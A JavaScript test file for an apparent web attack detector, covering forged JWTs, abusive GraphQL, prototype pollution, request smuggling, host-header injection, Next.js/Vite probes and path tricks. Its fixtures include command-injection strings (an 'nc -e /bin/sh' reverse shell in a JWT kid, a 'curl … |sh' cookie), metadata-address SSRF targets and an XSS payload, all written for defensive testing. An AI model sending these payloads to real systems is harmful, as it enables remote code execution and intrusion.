// Engine 3's attack families, each with the ordinary requests that look like it
// (the corpus has more of both): forged tokens, GraphQL built to exhaust a
// server, prototype pollution, request smuggling as the headers show it, path
// tricks and cache deception, host-header poisoning, Next.js and Vite.
import { test } from "node:test";
import assert from "node:assert/strict";
import { inspect, catalog } from "../core/payloads.mjs";
import { jwt, graphql } from "../core/detect.mjs";
import { CATEGORIES } from "../core/taxonomy.mjs";

const b64 = (o) => Buffer.from(JSON.stringify(o)).toString("base64url");
const token = (head, sig = "c2ln") => `${b64(head)}.${b64({ sub: "bob" })}.${sig}`;
const H = (headers, extra = {}) => inspect({ method: "GET", path: "/api/me", ua: "Mozilla/5.0", headers, ...extra });
const payload = (v) => v.score === 3;
const nothing = (v) => !v.id || v.pts === 0;

test("forged tokens: alg none, kid tricks, keys from elsewhere, psychic signatures", () => {
  for (const [head, sig, why] of [[{ alg: "none" }, "", /alg.*none/], [{ alg: "NoNe", typ: "JWT" }, "", /no signature/], [{ alg: "HS256", kid: "../../dev/null" }, "c2ln", /file path/],
                                  [{ alg: "HS256", kid: "k' UNION SELECT 'a" }, "c2ln", /SQL/], [{ alg: "HS256", kid: "x|nc -e /bin/sh 198.51.100.1 4444" }, "c2ln", /command/],
                                  [{ alg: "RS256", jku: "http://keys.example/jwks.json" }, "c2ln", /over http/], [{ alg: "RS256", x5u: "https://169.254.169.254/x" }, "c2ln", /an address/],
                                  [{ alg: "ES256" }, "MAYCAQACAQA", /psychic/]]) {
    const v = H({ authorization: `Bearer ${token(head, sig)}` });
    assert.ok(payload(v), JSON.stringify(head));
    assert.equal(v.cat, "auth");
    assert.match(v.det, why);
  }
  assert.equal(jwt(token({ alg: "ES256" }, "MAYCAQACAQA")).cve, "CVE-2022-21449");
  assert.equal(H({ authorization: `Bearer ${token({ alg: "none" }, "")}` }).cve, "CVE-2015-9235", "the CVE travels with the hit");
  // in a cookie, a query, any header
  assert.ok(payload(H({ cookie: `a=1; jwt=${token({ alg: "none" }, "")}` })));
  assert.ok(payload(inspect({ path: `/x?token=${token({ alg: "none" }, "")}` })));
  assert.ok(payload(H({ "x-auth-token": token({ alg: "none" }, "") })));
  // a key server on another site: flagged, not dropped; the same site's: nothing
  const foreign = H({ authorization: `Bearer ${token({ alg: "RS256", jku: "https://keys.other.example/jwks" })}`, host: "app.example" });
  assert.ok(!payload(foreign) && foreign.pts === 4);
  assert.ok(nothing(H({ authorization: `Bearer ${token({ alg: "RS256", jku: "https://login.app.example/jwks" })}`, host: "app.example" })));
  // ordinary tokens: any algorithm, ids that are names, hashes, "auth0|…", a payload that says "none"
  for (const head of [{ alg: "HS256" }, { alg: "RS256", kid: "key-2026" }, { alg: "ES256", kid: "auth0|abc/2025" }, { alg: "EdDSA" }, { alg: "PS512", kid: "/keys/v1" }, { alg: "RS256", kid: "c:x" }]) {
    assert.ok(nothing(H({ authorization: `Bearer ${token(head)}` })), JSON.stringify(head));
  }
  assert.ok(nothing(H({ authorization: `Bearer ${b64({ alg: "HS256" })}.${b64({ alg: "none", kid: "../x" })}.sig` })), "the claims are the app's business");
  assert.ok(nothing(H({ authorization: "Bearer none" })));
  assert.ok(nothing(H({ dpop: token({ typ: "dpop+jwt", alg: "ES256", jwk: { kty: "EC" } }) })), "a DPoP proof carries its key by design");
  assert.ok(nothing(inspect({ path: "/tools/jwt?alg=none" })), "a JWT debugger's form");
});

test("GraphQL built to exhaust a server, and queries that only look big", () => {
  const nest = (n) => "{" + "a{".repeat(n) + "id" + "}".repeat(n + 1);
  assert.equal(graphql(nest(30)).sev, "critical");
  assert.equal(graphql(nest(18)).sev, "high");
  assert.equal(graphql(nest(11)), null, "connections nest about ten deep");
  assert.equal(graphql("{__schema{types{fields{type{fields{type{fields{type{name}}}}}}}}}").sev, "critical", "introspection, cycled");
  assert.equal(graphql(`mutation{${Array.from({ length: 25 }, (_, i) => `a${i}:login(u:"admin",p:"${i}"){token}`).join(" ")}}`).sev, "critical", "a password guessed 25 times in one request");
  assert.equal(graphql(`{${Array.from({ length: 60 }, (_, i) => `f${i}:field${i}`).join(" ")}}`).sev, "high");
  assert.equal(graphql(`{__typename ${"@a".repeat(60)}}`).sev, "critical");
  // strings, arguments and variables aren't aliases or nesting
  assert.equal(graphql('{search(q:"{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{"){id}}'), null);
  assert.equal(graphql("query($a:Int,$b:Int,$c:String){x(a:$a,b:$b,c:$c){y}}"), null);
  assert.ok(payload(inspect({ path: `/graphql?query=${encodeURIComponent(nest(30))}` })));
  assert.ok(nothing(inspect({ path: `/search?q=${encodeURIComponent(nest(30))}` })), "only a parameter named query is read as GraphQL");
});

test("prototype pollution: keys, JSON keys, route segments; words about it are not", () => {
  for (const p of ["/api/user/__proto__/admin", "/api/x/constructor/prototype/y", '/x?f={"__proto__":{"a":1}}', '/x?f={"constructor":{"prototype":{"a":1}}}']) assert.ok(payload(inspect({ path: p })), p);
  assert.ok(payload(H({ "x-prefs": '{"__proto__":{"isAdmin":true}}' })));
  assert.ok(payload(H({ cookie: `prefs=${encodeURIComponent('{"__proto__":{"admin":1}}')}` })), "an encoded cookie");
  for (const p of ["/wiki/Prototype_pollution", "/learn/__proto__-explained", "/q?topic=prototype", "/api/fields?x=constructor,prototype"]) assert.ok(nothing(inspect({ path: p })), p);
});

test("request smuggling as the headers show it: a body where none belongs, HTTP/1.0, hop-by-hop, obs-fold", () => {
  const hit = (v) => v.hits.includes("smuggling");
  assert.ok(hit(inspect({ method: "GET", path: "/", headers: { "transfer-encoding": "chunked" } })));
  assert.ok(hit(inspect({ method: "HEAD", path: "/", headers: { "transfer-encoding": "chunked" } })));
  assert.ok(hit(inspect({ method: "POST", path: "/", proto: "1.0", headers: { "transfer-encoding": "chunked" } })));
  assert.ok(hit(inspect({ method: "GET", path: "/assets/app.css", headers: { "content-length": "40" } })), "CL.0 on a static file");
  assert.ok(hit(inspect({ method: "GET", path: "/", headers: { connection: "close, Content-Length" } })));
  assert.ok(hit(inspect({ method: "GET", path: "/", headers: { "x-foo": "a\r\n bar" } })), "obs-fold");
  assert.ok(hit(inspect({ method: "GET", path: "/", headers: { "x-foo": "a\n\tTransfer-Encoding: chunked" } })));
  assert.ok(!hit(inspect({ method: "POST", path: "/", proto: "1.1", headers: { "transfer-encoding": "chunked" } })));
  assert.ok(!hit(inspect({ method: "GET", path: "/api/search", headers: { "content-length": "40" } })), "a GET with a body to an API (Elasticsearch-style)");
  assert.ok(!hit(inspect({ method: "GET", path: "/", headers: { connection: "keep-alive, Upgrade", upgrade: "websocket" } })));
  assert.ok(!hit(inspect({ method: "POST", path: "/svc", headers: { connection: "TE", te: "trailers" } })), "gRPC");
});

test("host headers: anything but a host name is an injection; a cache's scheme and prefix headers too", () => {
  for (const h of [{ host: "app.example@evil.example" }, { host: "app.example:evil" }, { "x-forwarded-host": "evil.example/x" }, { "x-forwarded-proto": "nothttps" },
                   { "x-forwarded-prefix": "//evil.example" }, { forwarded: 'for=1.2.3.4;host="evil.example/x"' }]) {
    const v = H(h);
    assert.ok(v.hits.includes("host-header"), JSON.stringify(h));
  }
  assert.ok(payload(H({ "x-forwarded-host": "abc.oastify.com" })), "a callback domain");
  assert.ok(payload(H({ "x-forwarded-host": 'x"><script>alert(1)</script>' })));
  for (const h of [{ host: "app.example:8443" }, { host: "[2001:db8::1]:443" }, { "x-forwarded-host": "a.example, b.example" }, { "x-forwarded-proto": "https" }, { "x-forwarded-proto": "https,http" },
                   { "x-forwarded-prefix": "/app/v2" }, { forwarded: "for=198.51.100.1;proto=https;host=app.example" }, { host: "localhost:3000" }]) {
    assert.ok(nothing(H(h)), JSON.stringify(h));
  }
});

test("Next.js and Vite: internal headers from outside, React2Shell probes, a Location in a request, new fs bypasses", () => {
  assert.equal(H({ "x-now-route-matches": "1" }).cve, "CVE-2024-46982");
  assert.ok(payload(H({ "x-now-route-matches": "1" })));
  const rsc = inspect({ method: "POST", path: "/", headers: { "next-action": "x" } });
  assert.equal(rsc.cve, "CVE-2025-55182"); assert.ok(!payload(rsc) && rsc.pts > 0, "a probe: flagged");
  assert.ok(nothing(inspect({ method: "POST", path: "/", headers: { "next-action": "7f3c8e1a9b2d4c6e8f0a1b3c5d7e9f1a2b4c6d8e" } })));
  assert.ok(nothing(H({ "x-nextjs-data": "1", rsc: "1", "next-router-prefetch": "1" })), "the Next.js client's own headers");
  assert.ok(payload(H({ location: "http://169.254.169.254/latest/meta-data/" })));
  assert.equal(H({ location: "https://evil.example/" }).cve, "CVE-2025-57822");
  assert.ok(payload(inspect({ path: "/src/x.js?.svg?.wasm?init" })));
  assert.ok(nothing(inspect({ path: "/src/x.wasm?init" })) && nothing(inspect({ path: "/src/logo.svg?import" })));
});

test("path tricks and cache deception; ordinary paths with dots and semicolons", () => {
  for (const p of ["/;/admin", "/%2e/admin", "/.;/console", "/api/;x/internal", "/static../x.py", "/account;x.css", "/me%3fx.js", "/me%23.png"]) {
    const v = inspect({ path: p });
    assert.ok(!nothing(v), p);
  }
  for (const p of ["/page;jsessionid=ABC123", "/cars;color=red/details", "/compare/v1.2...v1.3", "/v2..v3/notes", "/.well-known/security.txt", "/files/notes;draft.txt", "/static/app.4f3a.css", "/wiki/C%23"]) {
    assert.ok(nothing(inspect({ path: p })), p);
  }
});

test("a header value's meaning is kept per value: the same answer the second time, and a new value is read anew", () => {
  const cookie = "session=abc; prefs=dark; _ga=GA1.1.42.1731990000";
  const a = H({ cookie }), b = H({ cookie });
  assert.deepEqual(a, b);
  assert.ok(nothing(a));
  assert.ok(payload(H({ cookie: cookie + "; x=$(curl http://198.51.100.1/x|sh)" })));
  assert.ok(nothing(H({ cookie })), "and the clean one is still clean");
});

test("the catalog and the taxonomy know every new name", () => {
  const ids = new Set(catalog().map((s) => s.id));
  for (const id of ["jwt-attack", "graphql-abuse", "host-header", "nextjs-cache-poison", "nextjs-rsc", "nextjs-ssrf", "path-confusion", "alias-traversal", "cache-deception", "vite-fs2"]) assert.ok(ids.has(id), id);
  assert.ok(CATEGORIES.some((c) => c.id === "auth"));
  for (const s of catalog()) assert.ok(CATEGORIES.some((c) => c.id === s.cat), `${s.id}: ${s.cat}`);
});
